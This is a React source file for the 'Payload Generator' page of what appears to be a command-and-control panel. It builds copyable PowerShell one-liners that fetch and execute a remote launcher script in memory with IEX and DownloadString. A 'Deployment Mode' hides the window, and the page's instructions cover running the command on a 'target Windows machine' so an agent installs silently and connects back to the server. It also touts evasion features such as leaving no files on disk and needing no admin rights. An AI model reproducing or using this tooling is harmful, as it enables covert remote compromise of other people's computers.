'use client';

import { useEffect, useState } from 'react';
import { Target, Copy, Check, Info, Rocket, Radio } from 'lucide-react';
import { getPayloadToken } from '@/lib/api';

export default function PayloadsPage() {
  const [serverHost, setServerHost] = useState('');
  const [serverPort, setServerPort] = useState('8000');
  const [mode, setMode] = useState<'debug' | 'deployment'>('deployment');
  const [copied, setCopied] = useState(false);
  const [configSource, setConfigSource] = useState<'env' | 'auto'>('auto');
  const [payloadToken, setPayloadToken] = useState('');
  const [tokenExpiresIn, setTokenExpiresIn] = useState(0);

  // Fetch current valid payload token from server
  const fetchPayloadToken = async () => {
    try {
      const data = await getPayloadToken();
      setPayloadToken(data.token);
      setTokenExpiresIn(data.expires_in);
    } catch (error) {
      console.error('Error fetching payload token:', error);
      // API helper already handles 401 and redirects to login
    }
  };

  // Load server configuration from env or auto-detect
  useEffect(() => {
    const apiUrl = process.env.NEXT_PUBLIC_API_URL;

    if (apiUrl) {
      try {
        // Parse the API URL to extract host and port
        const url = new URL(apiUrl);
        setServerHost(url.hostname);
        setServerPort(url.port || '8000');
        setConfigSource('env');
      } catch (error) {
        // Fallback to auto-detect if URL parsing fails
        console.error('Failed to parse NEXT_PUBLIC_API_URL:', error);
        setServerHost(window.location.hostname);
        setServerPort('8000');
        setConfigSource('auto');
      }
    } else {
      // Fallback: auto-detect from browser
      setServerHost(window.location.hostname);
      setServerPort('8000');
      setConfigSource('auto');
    }

    // Fetch initial token
    fetchPayloadToken();
  }, []);

  // Auto-refresh token every 4 minutes (before 5-minute expiry)
  useEffect(() => {
    const refreshInterval = setInterval(() => {
      fetchPayloadToken();
    }, 4 * 60 * 1000); // 4 minutes

    return () => clearInterval(refreshInterval);
  }, []);

  // Update countdown timer every second
  useEffect(() => {
    const countdown = setInterval(() => {
      setTokenExpiresIn((prev) => Math.max(0, prev - 1));
    }, 1000);

    return () => clearInterval(countdown);
  }, []);

  // Validate server host format (hostname, domain, or IP)
  const isValidServerHost = (host: string): boolean => {
    if (!host || host.trim() === '') return false;
    // Strip any protocol prefix first
    const cleaned = host.replace(/^https?:\/\//, '').trim();
    // Check for valid hostname, domain, or IP format
    const pattern = /^[\w\.-]+$/;
    return pattern.test(cleaned);
  };

  // Validate port number
  const isValidPort = (port: string): boolean => {
    const portNum = parseInt(port, 10);
    return !isNaN(portNum) && portNum >= 1 && portNum <= 65535;
  };

  const hostValid = isValidServerHost(serverHost);
  const portValid = isValidPort(serverPort);
  const addressValid = hostValid && portValid;

  // Generate payload based on mode and server address
  const generatePayload = () => {
    // Strip any http:// or https:// prefix from server host
    const cleanHost = serverHost.replace(/^https?:\/\//, '').trim();
    const baseUrl = `http://${cleanHost}:${serverPort}/payload/launcher.ps1?id=${payloadToken}`;

    if (mode === 'debug') {
      return `powershell -c "IEX(New-Object Net.WebClient).DownloadString('${baseUrl}')"`;
    } else {
      // Fixed: Proper PowerShell quoting for hidden background execution
      return `Start-Process powershell -WindowStyle Hidden -ArgumentList '-Command',"IEX(New-Object Net.WebClient).DownloadString('${baseUrl}')"`;
    }
  };

  const payload = generatePayload();

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(payload);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (error) {
      console.error('Failed to copy:', error);
    }
  };

  return (
    <div className="p-8">
      {/* Header */}
      <div className="mb-8">
        <h1 className="text-3xl font-bold flex items-center gap-3">
          <Target className="w-8 h-8 text-blue-500" />
          Payload Generator
        </h1>
        <p className="text-gray-400 mt-2">
          Generate one-liner commands to deploy agents remotely
        </p>
      </div>

      {/* Server Configuration Card */}
      <div className="bg-gray-900 rounded-lg p-6 mb-6 border border-gray-800">
        <h2 className="text-xl font-semibold mb-4 flex items-center gap-2">
          <Radio className="w-5 h-5 text-blue-500" />
          Server Configuration
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          {/* Server Address Field */}
          <div className="md:col-span-2">
            <label className="block text-sm text-gray-400 mb-2">
              Server Address:
            </label>
            <input
              type="text"
              value={serverHost}
              onChange={(e) => setServerHost(e.target.value)}
              className={`w-full bg-gray-800 rounded px-4 py-2 text-white focus:outline-none transition-colors ${
                hostValid || serverHost === ''
                  ? 'border border-gray-700 focus:border-blue-500'
                  : 'border-2 border-red-500 focus:border-red-400'
              }`}
              placeholder="192.168.1.10 or c2.example.com"
            />
            {!hostValid && serverHost !== '' && (
              <p className="text-xs text-red-400 mt-1 flex items-center gap-1">
                <Info className="w-3 h-3" />
                Invalid host format
              </p>
            )}
          </div>

          {/* Port Field */}
          <div>
            <label className="block text-sm text-gray-400 mb-2">
              Port:
            </label>
            <input
              type="number"
              min="1"
              max="65535"
              value={serverPort}
              onChange={(e) => setServerPort(e.target.value)}
              className={`w-full bg-gray-800 rounded px-4 py-2 text-white focus:outline-none transition-colors ${
                portValid
                  ? 'border border-gray-700 focus:border-blue-500'
                  : 'border-2 border-red-500 focus:border-red-400'
              }`}
              placeholder="8000"
            />
            {!portValid && (
              <p className="text-xs text-red-400 mt-1 flex items-center gap-1">
                <Info className="w-3 h-3" />
                Port: 1-65535
              </p>
            )}
          </div>
        </div>

        {addressValid && (
          <div className="mt-3 space-y-1">
            <p className="text-xs text-gray-500 flex items-center gap-1">
              <Info className="w-3 h-3" />
              {configSource === 'env'
                ? 'Loaded from NEXT_PUBLIC_API_URL configuration'
                : 'Auto-detected from current connection'}
            </p>
            {payloadToken && (
              <p className="text-xs text-blue-400 flex items-center gap-1">
                <Info className="w-3 h-3" />
                Token-protected payload (expires in {Math.floor(tokenExpiresIn / 60)}:{(tokenExpiresIn % 60).toString().padStart(2, '0')})
              </p>
            )}
          </div>
        )}
      </div>

      {/* Payload Generator Card */}
      <div className="bg-gray-900 rounded-lg p-6 mb-6 border border-gray-800">
        <h2 className="text-xl font-semibold mb-4 flex items-center gap-2">
          <Rocket className="w-5 h-5 text-blue-500" />
          Generated Payloads
        </h2>

        {/* Mode Tabs */}
        <div className="flex gap-4 mb-4 border-b border-gray-800">
          <button
            onClick={() => setMode('debug')}
            className={`pb-2 px-4 transition-colors ${
              mode === 'debug'
                ? 'border-b-2 border-blue-500 text-blue-500'
                : 'text-gray-400 hover:text-gray-200'
            }`}
          >
            Debug Mode
          </button>

          <button
            onClick={() => setMode('deployment')}
            className={`pb-2 px-4 transition-colors ${
              mode === 'deployment'
                ? 'border-b-2 border-blue-500 text-blue-500'
                : 'text-gray-400 hover:text-gray-200'
            }`}
          >
            Deployment Mode
          </button>
        </div>

        {/* Code Block */}
        <div className="relative">
          <pre className="bg-gray-800 rounded p-4 text-sm overflow-x-auto border border-gray-700">
            <code className="text-green-400">{payload}</code>
          </pre>

          <button
            onClick={handleCopy}
            disabled={!addressValid || !payloadToken}
            className={`absolute top-2 right-2 px-4 py-2 rounded flex items-center gap-2 transition-colors ${
              addressValid && payloadToken
                ? 'bg-blue-600 hover:bg-blue-700 text-white cursor-pointer'
                : 'bg-gray-700 text-gray-500 cursor-not-allowed'
            }`}
          >
            {copied ? (
              <>
                <Check className="w-4 h-4" />
                Copied!
              </>
            ) : (
              <>
                <Copy className="w-4 h-4" />
                
              </>
            )}
          </button>
        </div>

        {/* Mode Info */}
        <p className="text-sm text-gray-400 mt-4 flex items-center gap-2">
          <Info className="w-4 h-4" />
          {mode === 'debug'
            ? 'Use this for testing. Shows installation output in the terminal.'
            : 'Runs completely hidden in background. No output shown. Ideal for deployment.'}
        </p>
      </div>

      {/* Instructions Card */}
      <div className="bg-gray-900 rounded-lg p-6 border border-gray-800">
        <h2 className="text-xl font-semibold mb-4 flex items-center gap-2">
          <Info className="w-5 h-5 text-blue-500" />
          How It Works
        </h2>

        <ol className="space-y-4 text-gray-300">
          <li className="flex gap-3">
            <span className="text-blue-500 font-bold flex-shrink-0">1.</span>
            <span>Copy the generated command above</span>
          </li>

          <li className="flex gap-3">
            <span className="text-blue-500 font-bold flex-shrink-0">2.</span>
            <span>Run it on target Windows machine (PowerShell)</span>
          </li>

          <li className="flex gap-3">
            <span className="text-blue-500 font-bold flex-shrink-0">3.</span>
            <div>
              <span className="block mb-2">The script will automatically:</span>
              <ul className="ml-4 space-y-1 text-sm text-gray-400">
                <li>• Check for Python installation</li>
                <li>• Install Python silently if needed (~50MB, user-level, no admin)</li>
                <li>• Install required dependencies (requests library)</li>
                <li>• Download and execute agent in memory (no files on disk!)</li>
                <li>• Connect back to this server</li>
              </ul>
            </div>
          </li>

          <li className="flex gap-3">
            <span className="text-blue-500 font-bold flex-shrink-0">4.</span>
            <span>Agent appears in Dashboard within seconds</span>
          </li>
        </ol>

        <div className="mt-6 border-t border-gray-800 pt-4">
          <h3 className="font-semibold mb-2 text-gray-200">Features:</h3>
          <ul className="space-y-1 text-sm text-gray-400">
            <li className="flex items-center gap-2">
              <Check className="w-4 h-4 text-green-500" />
              100% in-memory execution (no files written to disk)
            </li>
            <li className="flex items-center gap-2">
              <Check className="w-4 h-4 text-green-500" />
              Minimal Python install (~50MB, user-level only)
            </li>
            <li className="flex items-center gap-2">
              <Check className="w-4 h-4 text-green-500" />
              Auto-installs all dependencies
            </li>
            <li className="flex items-center gap-2">
              <Check className="w-4 h-4 text-green-500" />
              Runs in background (Deployment mode)
            </li>
            <li className="flex items-center gap-2">
              <Check className="w-4 h-4 text-green-500" />
              No admin privileges required
            </li>
          </ul>
        </div>
      </div>
    </div>
  );
}
